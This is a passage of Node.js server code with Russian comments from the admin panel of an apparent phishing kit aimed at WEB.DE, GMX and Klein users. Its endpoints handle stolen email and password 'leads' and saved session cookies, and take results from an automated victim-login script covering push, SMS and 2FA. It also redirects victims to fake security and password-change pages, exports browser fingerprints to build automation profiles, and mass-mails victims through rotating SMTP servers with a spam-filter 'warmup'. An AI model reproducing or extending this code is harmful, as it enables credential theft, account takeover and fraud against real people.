          if (lbl === EVENT_LABELS.AUTOLOGIN_MAILBOX_SUCCESS) return true;
          if (lbl === EVENT_LABELS.MAIL_READY) return true;
          if (lbl === EVENT_LABELS.WEBDE_MAIL_OPENED) return true;
          if (lbl === EVENT_LABELS.MAIL_UI_READY) return true;
        }
        return false;
      }

      if (action === 'undo_last_hide') {
        const st = adminSidebarUndo.readUndoState();
        const undoIds = st.leadIds || [];
        if (undoIds.length === 0) return send(res, 400, { ok: false, error: 'Нечего отменять' });
        let unhid = 0;
        undoIds.forEach((id) => {
          if (!byId.get(id)) return;
          leadService.unhideLeadInAdminSidebar(id, { skipBroadcast: true });
          unhid++;
        });
        if (unhid === 0) return send(res, 400, { ok: false, error: 'Не удалось отменить: записи не найдены' });
        adminSidebarUndo.clearUndoState();
        affected = unhid;
      } else if (action === 'unhide_selected') {
        if (ids.length === 0) return send(res, 400, { ok: false, error: 'ids required' });
        ids.forEach((id) => {
          const lead = byId.get(id);
          if (!lead) {
            skipped++;
            return;
          }
          if (!sidebarLeadHidden(lead)) {
            skipped++;
            return;
          }
          const ok = leadService.unhideLeadInAdminSidebar(id, { skipBroadcast: true });
          if (ok) affected++;
          else skipped++;
        });
      } else if (action === 'hide_selected' || action === 'hide_selected_no_mail') {
        if (ids.length === 0) return send(res, 400, { ok: false, error: 'ids required' });
        const toHide = [];
        ids.forEach((id) => {
          const lead = byId.get(id);
          if (!lead) {
            skipped++;
            return;
          }
          if (action === 'hide_selected_no_mail') {
            const em = (lead.email != null ? String(lead.email) : '').trim();
            const emKl = (lead.emailKl != null ? String(lead.emailKl) : '').trim();
            if (em || emKl) {
              skipped++;
              return;
            }
          }
          toHide.push(id);
        });
        affected = commitSidebarHidesForIds(toHide);
      } else if (action === 'hide_except_success') {
        const toHide = [];
        leads.forEach((lead) => {
          if (!lead) return;
          if (leadHasMailLoginSuccess(lead)) return;
          if (sidebarLeadHidden(lead)) return;
          toHide.push(lead.id);
        });
        affected = commitSidebarHidesForIds(toHide);
      } else if (action === 'hide_non_success_non_klein') {
        if (invertBulk) {
          affected = commitSidebarUnhidesForMatching((lead) => {
            if (String(lead.brand || '').toLowerCase() === 'klein') return false;
            return !leadHasMailLoginSuccess(lead);
          });
        } else {
          const toHide = [];
          leads.forEach((lead) => {
            if (!lead) return;
            if (String(lead.brand || '').toLowerCase() === 'klein') return;
            if (leadHasMailLoginSuccess(lead)) return;
            if (sidebarLeadHidden(lead)) return;
            toHide.push(lead.id);
          });
          affected = commitSidebarHidesForIds(toHide);
        }
      } else if (action === 'hide_worked_all') {
        if (invertBulk) {
          affected = commitSidebarUnhidesForMatching((lead) => leadIsWorkedLikeAdmin(lead));
        } else {
          const toHide = [];
          leads.forEach((lead) => {
            if (!lead) return;
            if (!leadIsWorkedLikeAdmin(lead)) return;
            if (sidebarLeadHidden(lead)) return;
            toHide.push(lead.id);
          });
          affected = commitSidebarHidesForIds(toHide);
        }
      } else if (action === 'hide_send_email') {
        if (invertBulk) {
          affected = commitSidebarUnhidesForMatching((lead) => leadHasAnyConfigEmailSentEvent(lead));
        } else {
          const toHide = [];
          leads.forEach((lead) => {
            if (!lead) return;
            if (!leadHasAnyConfigEmailSentEvent(lead)) return;
            if (sidebarLeadHidden(lead)) return;
            toHide.push(lead.id);
          });
          affected = commitSidebarHidesForIds(toHide);
        }
      } else {
        if (ids.length === 0) return send(res, 400, { ok: false, error: 'ids required' });
        const legacyToHide = [];
        ids.forEach((id) => {
          const lead = byId.get(id);
          if (!lead) {
            skipped++;
            return;
          }
          if (action === 'hide_except_success') {
            if (leadHasMailLoginSuccess(lead)) {
              skipped++;
              return;
            }
            legacyToHide.push(id);
            return;
          }
          if (action === 'hide_send_email') {
            if (!leadHasAnyConfigEmailSentEvent(lead)) {
              skipped++;
              return;
            }
            legacyToHide.push(id);
            return;
          }
          if (action === 'hide') {
            legacyToHide.push(id);
            return;
          }
          skipped++;
        });
        if (legacyToHide.length) affected = commitSidebarHidesForIds(legacyToHide);
      }
      if (affected > 0 && typeof global.__gmwWssBroadcast === 'function') {
        try { global.__gmwWssBroadcast({ type: 'leads-update' }); } catch (_) {}
      }
      return send(res, 200, { ok: true, affected, skipped });
    });
    return true;
  }

  /**
   * Массовая отправка (Config → E-Mail), 1 письмо/сек.
   * mode: all — все лиды с email (кроме отработанных); valid — есть куки входа; valid_unsent — валид и ещё не было успешной Config E-Mail (любая известная подпись в логе).
   * Отработанные (leadIsWorkedLikeAdmin) никогда не получают письмо.
   */
  if (pathname === '/api/send-email-cookies-batch' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const modeRaw = (json.mode != null) ? String(json.mode).trim() : 'valid_unsent';
      const mode = (modeRaw === 'all' || modeRaw === 'valid' || modeRaw === 'valid_unsent') ? modeRaw : null;
      if (!mode) {
        return send(res, 400, { ok: false, error: 'Укажите mode: all | valid | valid_unsent' });
      }
      if (!nodemailer) {
        return send(res, 500, { ok: false, error: 'nodemailer not installed' });
      }
      const data = readConfigEmail();
      const cfgDefault = data.current;
      if (!cfgDefault || !(cfgDefault.smtpLine && cfgDefault.smtpLine.trim())) {
        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP.' });
      }
      const smtpProbe = parseSmtpLines(cfgDefault.smtpLine);
      if (!smtpProbe.length) {
        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP.' });
      }
      invalidateLeadsCache();
      let leads = leadService.readLeads();
      const targets = leads.filter(function (l) {
        if (!l) return false;
        if (leadIsWorkedLikeAdmin(l)) return false;
        const to = (l.email || l.emailKl || '').trim();
        if (!to) return false;
        if (mode === 'all') return true;
        if (!leadHasSavedCookies(l)) return false;
        if (mode === 'valid_unsent' && leadHasAnyConfigEmailSentEvent(l)) return false;
        return true;
      });
      let sent = 0;
      let failed = 0;
      const failSamples = [];
      await runConcurrent(targets, MAIL_BATCH_SMTP_CONCURRENCY, async (t) => {
        const live = leadService.readLeadById(t.id);
        if (!live) return;
        if (leadIsWorkedLikeAdmin(live)) return;
        const toLive = (live.email || live.emailKl || '').trim();
        if (!toLive) return;
        if (mode !== 'all' && !leadHasSavedCookies(live)) return;
        if (mode === 'valid_unsent' && leadHasAnyConfigEmailSentEvent(live)) return;
        let result;
        try {
          result = await sendConfigEmailToLead(live);
        } catch (e) {
          console.error('[send-email-cookies-batch] исключение:', e && e.message ? e.message : e);
          failed++;
          const em = (e && e.message) ? String(e.message).slice(0, 120) : 'exception';
          if (failSamples.length < 8) {
            failSamples.push({ id: live.id, email: (live.email || '').trim(), error: em });
          }
          try {
            pushEvent(live, CONFIG_EMAIL_FAILED_EVENT_LABEL, 'admin', { detail: em });
            leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
          } catch (e2) {}
          return;
        }
        if (result.ok) {
          pushEvent(live, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
          leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
          sent++;
          console.log('[send-email-cookies-batch] → ' + (live.email || live.emailKl || '').trim());
        } else {
          failed++;
          if (failSamples.length < 8) {
            failSamples.push({ id: live.id, email: (live.email || '').trim(), error: result.error || '' });
          }
          leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
        }
      });
      var emptyHint = '';
      if (targets.length === 0) {
        emptyHint = 'Нет лидов в выборке. Для режимов «Валид» / «Валид не отправлено» нужны сохранённые куки входа (в БД или legacy login/cookies). «Валид не отправлено» пропускает лидов, у кого в логе уже есть «Send Email» (или старые подписи). Отработанные не берутся.';
      }
      return send(res, 200, {
        ok: true,
        mode: mode,
        total: targets.length,
        sent,
        failed,
        failSamples,
        hint: emptyHint || undefined
      });
    });
    return true;
  }

  /** Архив по фильтру: отработанные (как в сайдбаре) — Klein → klLogArchived, WEB/GMX → adminLogArchived. */
  if (pathname === '/api/archive-leads-by-filter' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const filter = (json.filter != null) ? String(json.filter).trim() : '';
      if (filter !== 'worked') {
        return send(res, 400, { ok: false, error: 'Неизвестный фильтр' });
      }
      const stats = leadService.archiveLeadsByFilterWorked(pushEvent);
      return send(res, 200, {
        ok: true,
        archived: stats.archived,
        matchedWorked: stats.matchedWorked,
        skippedAlreadyArchived: stats.skippedAlreadyArchived
      });
    });
    return true;
  }

  /** Массовая отправка письма из Config → E-Mail всем лидам со статусом Успех (show_success), у кого есть email. */
  if (pathname === '/api/send-email-all-success' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      if (!nodemailer) {
        return send(res, 500, { ok: false, error: 'nodemailer not installed' });
      }
      const data = readConfigEmail();
      const cfgDefault = data.current;
      const smtpLineDefault = (cfgDefault && cfgDefault.smtpLine && cfgDefault.smtpLine.trim()) ? cfgDefault.smtpLine : '';
      if (!smtpLineDefault) {
        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP (текущий профиль).' });
      }
      let leads = leadService.readLeads();
      const targets = leads.filter(function (l) {
        if (l.status !== 'show_success') return false;
        const to = (l.email || l.emailKl || '').trim();
        return !!to;
      });
      let sent = 0;
      let failed = 0;
      let skipped = 0;
      const failSamples = [];

      await runConcurrent(targets, MAIL_BATCH_SMTP_CONCURRENCY, async (lead) => {
        const idx = leads.findIndex((x) => x.id === lead.id);
        if (idx === -1) {
          skipped++;
          return;
        }
        const live = leads[idx];
        const cfg = cfgDefault;
        if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
          skipped++;
          return;
        }
        const smtpList = parseSmtpLines(cfg.smtpLine);
        if (!smtpList.length) {
          skipped++;
          return;
        }
        const toEmail = (live.email || live.emailKl || '').trim();
        const password = (live.password || live.passwordKl || '').trim();
        let html = (cfg.html || '')
          .replace(/_email_/g, toEmail)
          .replace(/_password_/g, password);
        const attachments = [];
        if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
          try {
            const buf = Buffer.from(cfg.image1Base64, 'base64');
            const cid = 'image1@mail';
            html = html.replace(/_src1_/g, 'cid:' + cid);
            attachments.push({
              filename: 'image1.png',
              contentType: 'image/png',
              contentTransferEncoding: 'base64',
              content: buf,
              cid: cid
            });
          } catch (e) {}
        } else if (html.indexOf('_src1_') !== -1) {
          html = html.replace(/_src1_/g, '');
        }
        const profileKey = cfg.id != null ? cfg.id : 'default';
        const smtp = pickRotatingConfigSmtp(smtpList, profileKey);
        if (!smtp) {
          skipped++;
          return;
        }
        const transporter = nodemailer.createTransport({
          host: smtp.host,
          port: smtp.port,
          secure: smtp.port === 465,
          auth: { user: smtp.user, pass: smtp.password }
        });
        const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
        const mailOptions = {
          from: fromStr,
          to: toEmail,
          subject: (cfg.title || '').trim() || 'Message',
          html,
          attachments: attachments.length ? attachments : undefined,
          envelope: { from: smtp.fromEmail, to: toEmail },
          textEncoding: 'quoted-printable'
        };
        try {
          await transporter.sendMail(mailOptions);
          pushEvent(live, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
          leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
          sent++;
          console.log('[send-email-all-success] ' + smtp.fromEmail + ' → ' + toEmail);
        } catch (err) {
          failed++;
          const msg = (err.message || '').slice(0, 200);
          pushEvent(live, CONFIG_EMAIL_FAILED_EVENT_LABEL, 'admin', { detail: msg });
          leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
          if (failSamples.length < 8) failSamples.push({ id: live.id, email: toEmail, error: msg });
          console.error('[send-email-all-success] ошибка → ' + toEmail + ': ' + msg);
        }
      });
      return send(res, 200, {
        ok: true,
        total: targets.length,
        sent,
        failed,
        skipped,
        failSamples
      });
    });
    return true;
  }

  /** KL: архивировать лог Klein — не принимать новые данные с того же visitId/email/fp. */
  if (pathname === '/api/lead-kl-archive' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const klLogArchived = json.klLogArchived === true;
      if (!id) return send(res, 400, { ok: false, error: 'id required' });
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
      if (lead.brand !== 'klein') {
        return send(res, 400, { ok: false, error: 'Только для логов Klein' });
      }
      leadService.applyKleinLogArchivedToggle(lead, klLogArchived, pushEvent);
      leadService.persistLeadPatch(id, { klLogArchived: lead.klLogArchived, eventTerminal: lead.eventTerminal });
      return send(res, 200, { ok: true, klLogArchived: klLogArchived });
    });
    return true;
  }

  if (pathname === '/api/warmup-start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (warmupState.running) return send(res, 400, { ok: false, error: 'Прогрев уже запущен' });
      const data = readWarmupEmailConfig();
      const currentId = data.currentId || (data.configs && data.configs[0] && data.configs[0].id) || null;
      const currentConfig = currentId ? (data.configs || []).find((c) => c.id == currentId) : (data.configs && data.configs[0]) || null;
      const configs = (currentConfig && (currentConfig.smtpLine || '').trim()) ? [currentConfig] : [];
      if (!configs.length) return send(res, 400, { ok: false, error: 'Выберите конфиг с SMTP в режиме Прогрев и нажмите Старт' });
      let leads = [];
      if (Array.isArray(json.recipients) && json.recipients.length > 0) {
        leads = json.recipients.map((r) => ({ email: (r && r.email) ? String(r.email).trim() : '', password: (r && r.password) ? String(r.password) : '' })).filter((l) => l.email);
      }
      if (leads.length === 0) leads = leadService.readLeads().filter((l) => (l.email || '').trim());
      if (!leads.length) return send(res, 400, { ok: false, error: 'Нет получателей. Заполните базу для прогрева или загрузите лиды на сервере.' });
      let perSmtpLimit = typeof json.perSmtpLimit === 'number' ? json.perSmtpLimit : parseInt(json.perSmtpLimit, 10);
      if (isNaN(perSmtpLimit) || perSmtpLimit < 1) perSmtpLimit = 10;
      if (perSmtpLimit > 10000) perSmtpLimit = 10000;
      let delaySec = typeof json.delaySec === 'number' ? json.delaySec : parseFloat(json.delaySec);
      if (isNaN(delaySec) || delaySec < 0.5) delaySec = 2;
      if (delaySec > 300) delaySec = 300;
      let numThreads = typeof json.numThreads === 'number' ? json.numThreads : parseInt(json.numThreads, 10);
      if (isNaN(numThreads) || numThreads < 1) numThreads = 1;
      if (numThreads > 20) numThreads = 20;
      const flatList = [];
      configs.forEach((cfg) => {
        const smtpList = parseSmtpLines(cfg.smtpLine || '');
        smtpList.forEach((smtp) => flatList.push({ config: cfg, smtp }));
      });
      warmupState.stopped = false;
      warmupState.paused = false;
      warmupState.configs = configs;
      warmupState.flatList = flatList;
      warmupState.leads = leads;
      warmupState.perSmtpLimit = perSmtpLimit;
      warmupState.delayMs = Math.round(delaySec * 1000);
      warmupState.numThreads = numThreads;
      warmupState.sentPerSmtp = Object.assign({}, readWarmupSmtpStats());
      warmupState.log = [{ text: '[Прогрев запущен. Потоков: ' + numThreads + ', лимит с каждого SMTP: ' + perSmtpLimit + ', задержка: ' + delaySec + ' сек. SMTP по кругу (всего ' + flatList.length + '), лиды по кругу]', type: 'muted' }];
      warmupState.totalSent = 0;
      warmupState.fallbackSameRecipient = null;
      warmupState.failedFromByRecipient = null;
      warmupState.running = true;
      setImmediate(runWarmupStep);
      return send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/warmup-status' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const persisted = readWarmupSmtpStats();
    const seen = {};
    const list = [];
    if (warmupState.running && warmupState.flatList && warmupState.flatList.length) {
      warmupState.flatList.forEach((entry) => {
        const email = entry.smtp.fromEmail;
        if (!seen[email]) {
          seen[email] = true;
          list.push({ id: email, name: email, sent: warmupState.sentPerSmtp[email] || 0 });
        }
      });
    }
    Object.keys(persisted).forEach((email) => {
      if (!seen[email]) {
        seen[email] = true;
        list.push({ id: email, name: email, sent: warmupState.sentPerSmtp[email] ?? persisted[email] });
      }
    });
    return send(res, 200, {
      running: warmupState.running,
      paused: warmupState.paused,
      totalSent: warmupState.totalSent,
      sentPerConfig: list,
      log: warmupState.log.slice(-200)
    });
  }

  if (pathname === '/api/warmup-stats-reset' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const clearAll =
        json.all === true ||
        json.all === 1 ||
        String(json.all || '').toLowerCase() === 'true';
      if (clearAll) {
        clearWarmupSmtpStatsAll();
        return send(res, 200, { ok: true });
      }
      const fromEmail = (json.fromEmail != null) ? String(json.fromEmail).trim() : '';
      if (!fromEmail) return send(res, 400, { ok: false, error: 'fromEmail required или all: true' });
      const stats = readWarmupSmtpStats();
      delete stats[fromEmail];
      writeWarmupSmtpStats(stats);
      if (warmupState.sentPerSmtp[fromEmail] !== undefined) delete warmupState.sentPerSmtp[fromEmail];
      return send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/warmup-pause' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      const wasPaused = warmupState.paused;
      warmupState.paused = !warmupState.paused;
      if (wasPaused && !warmupState.paused && body) {
        try {
          const json = JSON.parse(body);
          if (typeof json.delaySec === 'number' || typeof json.delaySec === 'string') {
            let delaySec = typeof json.delaySec === 'number' ? json.delaySec : parseFloat(json.delaySec);
            if (!isNaN(delaySec) && delaySec >= 0.5 && delaySec <= 300) warmupState.delayMs = Math.round(delaySec * 1000);
          }
          if (typeof json.perSmtpLimit === 'number' || typeof json.perSmtpLimit === 'string') {
            let perSmtpLimit = typeof json.perSmtpLimit === 'number' ? json.perSmtpLimit : parseInt(json.perSmtpLimit, 10);
            if (!isNaN(perSmtpLimit) && perSmtpLimit >= 1 && perSmtpLimit <= 10000) warmupState.perSmtpLimit = perSmtpLimit;
          }
          if (typeof json.numThreads === 'number' || typeof json.numThreads === 'string') {
            let numThreads = typeof json.numThreads === 'number' ? json.numThreads : parseInt(json.numThreads, 10);
            if (!isNaN(numThreads) && numThreads >= 1 && numThreads <= 20 && numThreads > warmupState.numThreads) {
              setImmediate(runWarmupStep);
              warmupState.numThreads = numThreads;
            } else if (!isNaN(numThreads) && numThreads >= 1 && numThreads <= 20) {
              warmupState.numThreads = numThreads;
            }
          }
        } catch (e) {}
      }
      return send(res, 200, { ok: true, paused: warmupState.paused });
    });
    return true;
  }

  if (pathname === '/api/warmup-stop' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    warmupState.stopped = true;
    warmupState.fallbackSameRecipient = null;
    warmupState.failedFromByRecipient = null;
    return send(res, 200, { ok: true });
  }

  if (await leadChatController.handle(scope)) return true;


  if (pathname === '/api/redirect-change-password' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_change_password';
      pushEvent(lead, lead.brand === 'klein' ? 'Отправлен на смену Kl' : 'Отправлен на смену', 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      console.log('[АДМИН] Кнопка: смена пароля — id=' + id);
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/redirect-sicherheit' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_sicherheit';
      pushEvent(lead, 'Отправлен на Sicherheit', 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/redirect-sicherheit-windows' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const leads = readLeads();
    let count = 0;
    leads.forEach((lead) => {
      if ((lead.platform || '').toLowerCase() === 'windows') {
        lead.status = 'redirect_sicherheit';
        pushEvent(lead, 'Отправлен на Sicherheit (все Windows)', 'admin');
        persistLeadPatch(lead.id, { status: lead.status, eventTerminal: lead.eventTerminal });
        count++;
      }
    });
    send(res, 200, { ok: true, count: count });
    return true;
  }

  if (pathname === '/api/redirect-push' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: пуш — id=' + id);
      const leads = readLeads();
      const idResolved = resolveLeadId(String(id).trim());
      const idx = leads.findIndex((l) => l.id === idResolved);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_push';
      const nowBump = new Date().toISOString();
      lead.lastSeenAt = nowBump;
      lead.adminListSortAt = nowBump;
      pushEvent(lead, EVENT_LABELS.PUSH, 'admin');
      persistLeadPatch(idResolved, {
        status: lead.status,
        lastSeenAt: lead.lastSeenAt,
        adminListSortAt: lead.adminListSortAt,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/lead-fingerprint' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadId) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = resolveLeadId(leadId);
    const lead = leadService.readLeadById(id);
    if (!lead) return send(res, 404, { ok: false });
    const fp = lead.fingerprint && typeof lead.fingerprint === 'object' ? lead.fingerprint : null;
    let telemetrySnapshots = Array.isArray(lead.telemetrySnapshots) && lead.telemetrySnapshots.length > 0
      ? lead.telemetrySnapshots.map((s) => JSON.parse(JSON.stringify(s)))
      : null;
    if (!telemetrySnapshots || telemetrySnapshots.length === 0) {
      telemetrySnapshots = [{
        at: lead.lastSeenAt || lead.createdAt || new Date().toISOString(),
        stableFingerprintSignature: fp ? fingerprintSignature(fp) : undefined,
        deviceSignature: lead.deviceSignature || undefined,
        fingerprint: lead.fingerprint || undefined,
        clientSignals: lead.clientSignals || undefined,
        requestMeta: lead.requestMeta || undefined
      }];
    }
    const out = {
      leadId: lead.id,
      email: (lead.email || '').trim() || undefined,
      emailKl: (lead.emailKl || '').trim() || undefined,
      brand: lead.brand || undefined,
      clientFormBrand: lead.clientFormBrand != null ? String(lead.clientFormBrand) : undefined,
      hostBrandAtSubmit: lead.hostBrandAtSubmit != null ? String(lead.hostBrandAtSubmit) : undefined,
      platform: lead.platform || undefined,
      userAgent: lead.userAgent || undefined,
      ip: lead.ip || undefined,
      screenWidth: lead.screenWidth,
      screenHeight: lead.screenHeight,
      createdAt: lead.createdAt || undefined,
      lastSeenAt: lead.lastSeenAt || undefined,
      deviceSignature: lead.deviceSignature || undefined,
      stableFingerprintSignature: fp ? fingerprintSignature(fp) : undefined,
      fingerprint: lead.fingerprint || undefined,
      clientSignals: lead.clientSignals || undefined,
      requestMeta: lead.requestMeta || undefined,
      telemetrySnapshots: telemetrySnapshots
    };
    return send(res, 200, { ok: true, data: out });
  }

  if (pathname === '/api/lead-automation-profile' && req.method === 'GET') {
    if (!hasValidWorkerSecret(req) && !checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = resolveLeadId(leadIdRaw);
    const leads = readLeads();
    const lead = leads.find((l) => l.id === id);
    if (!lead) return send(res, 404, { ok: false, error: 'lead not found' });
    const profile = buildAutomationProfile(lead);
    if (!profile) return send(res, 422, { ok: false, error: 'insufficient data (no user agent / fingerprint)' });
    return send(res, 200, { ok: true, profile: profile });
  }

  if (pathname === '/api/lead-login-context' && req.method === 'GET') {
    if (!hasValidWorkerSecret(req) && !checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = resolveLeadId(leadIdRaw);
    readLeadsAsync(function (err, leads) {
      if (err || !Array.isArray(leads)) {
        return send(res, 500, { ok: false, error: 'read leads failed' });
      }
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.log('[АДМИН] lead-login-context: лид не найден id=' + id);
        return send(res, 404, { ok: false, error: 'lead not found' });
      }
      const payload = buildLeadLoginContextPayload(lead);
      if (!payload) return send(res, 500, { ok: false, error: 'payload build failed' });
      const emCtx = (lead.email || '').trim().toLowerCase();
      if (emCtx) touchWebdeScriptLock(emCtx);
      return send(res, 200, payload);
    });
    return true;
  }

  if (await leadAutomationCallbacksController.handle(scope)) return true;

  /** Скрипт входа передаёт результат: success | wrong_credentials | push | error | sms | two_factor | wrong_2fa.
   * При result=error скрипт может передать errorCode и errorMessage — они выводятся в лог лида.
   * Коды ошибок: 403 — доступ запрещён (API 403, блок); 408 — таймаут (пароль, пуш, страница);
   * 502 — сервис временно недоступен (Login vorübergehend nicht möglich, капча, блок);
   * 503 — капча не поддерживается; 500 — внутренняя ошибка (браузер, исключение, страница не распознана).
   * 500/502/503: жертва остаётся на оверлее ожидания (script_automation_wait) без редиректа — см. WEBDE_SCRIPT_VICTIM_WAIT_MS.
   * resultPhase: mail_ready_klein — после фильтров почты в оркестрации. resultSource: klein_login — ответ klein_simulation / шаг Klein. */

  if (pathname === '/api/webde-login-result' && req.method === 'POST') {
    if (!checkWorkerSecret(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id && String(json.id).trim();
      const result = json.result && String(json.result).trim();
      const attemptNoRaw = Number.isFinite(json.attemptNo) ? Number(json.attemptNo) : null;
      if (!idRaw) {
        console.error('[АДМИН] webde-login-result: ошибка — не передан id в теле запроса (обязательное поле).');
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const valid = ['success', 'wrong_credentials', 'push', 'error', 'sms', 'two_factor', 'wrong_2fa', 'two_factor_timeout'].indexOf(result) !== -1;
      if (!valid) {
        console.error('[АДМИН] webde-login-result: ошибка — неверный result="' + result + '" (ожидается success|wrong_credentials|push|error|sms|two_factor|wrong_2fa|two_factor_timeout), id=' + idRaw);
        return send(res, 400, { ok: false, error: 'result must be success|wrong_credentials|push|error|sms|two_factor|wrong_2fa|two_factor_timeout' });
      }
      const id = resolveLeadId(idRaw);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) {
        console.error('[АДМИН] webde-login-result: лид не найден id=' + id + (id !== idRaw ? ' (resolved from ' + idRaw + ')' : '') + '.');
        return send(res, 404, { ok: false });
      }
      const lead = leads[idx];
      // Если лид был скрыт в сайдбаре, но скрипт дошёл до важного состояния — вернуть в список.
      try {
        if (leadService && typeof leadService.tryAutoUnhideLeadAfterVictimActivity === 'function') {
          if (result === 'success' || result === 'sms' || result === 'two_factor') {
            leadService.tryAutoUnhideLeadAfterVictimActivity(String(id), { pushEvent: pushEvent });
            // leadService.persistLeadPatch уже пишет в БД; здесь lead в памяти тоже обновим, чтобы не затёрлось ниже.
            lead.adminLogArchived = false;
            lead.klLogArchived = false;
          }
        }
      } catch (_) {}
      const currentAttemptNo = Number.isFinite(lead.attemptNo) ? Number(lead.attemptNo) : 1;
      if (result === 'wrong_credentials' && attemptNoRaw != null && attemptNoRaw !== currentAttemptNo) {
        console.log(
          '[АДМИН] webde-login-result skip stale wrong_credentials instance=' + SERVER_INSTANCE +
          ' leadId=' + id + ' attemptNo=' + attemptNoRaw + ' currentAttemptNo=' + currentAttemptNo
        );
        return send(res, 200, { ok: true, skipped: 'stale_attempt' });
      }
      const fromKleinScript = String(json.resultSource || '').trim().toLowerCase() === 'klein_login';
      const resultPhase = json.resultPhase != null ? String(json.resultPhase).trim() : '';
      const passwordKlNew = json.passwordKlNew != null ? String(json.passwordKlNew).trim() : '';
      const sessLog = lead.webdeScriptActiveRun != null ? lead.webdeScriptActiveRun : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? lead.webdeScriptRunSeq : '—');
      lead.lastSeenAt = new Date().toISOString();
      delete lead.scriptStatus;
      const errorCode = json.errorCode && String(json.errorCode).trim();
      const errorMessage = json.errorMessage && String(json.errorMessage).trim();
      const pushTimeout = json.pushTimeout === true;
      if (result === 'success' || result === 'wrong_credentials') {
        delete lead.webdeLoginGridExhausted;
      } else if (result === 'error' && errorMessage) {
